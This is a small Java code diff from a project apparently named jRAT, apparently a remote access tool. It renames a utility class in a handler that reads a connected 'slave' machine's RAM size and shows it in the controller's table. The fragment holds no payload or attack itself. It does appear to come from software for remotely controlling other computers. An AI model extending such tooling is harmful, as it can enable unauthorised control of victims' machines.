@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.Frame;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 public class Packet63InitRAM extends AbstractIncomingPacket {
@@ -14,7 +14,7 @@ public class Packet63InitRAM extends AbstractIncomingPacket {
 		short ram = slave.readShort();
 		slave.setRam(ram);
 		
-		int row = Util.getRow(slave);
+		int row = Utils.getRow(slave);
 		
 		Frame.mainModel.setValueAt(ram + " mb", row, 7);
 	}
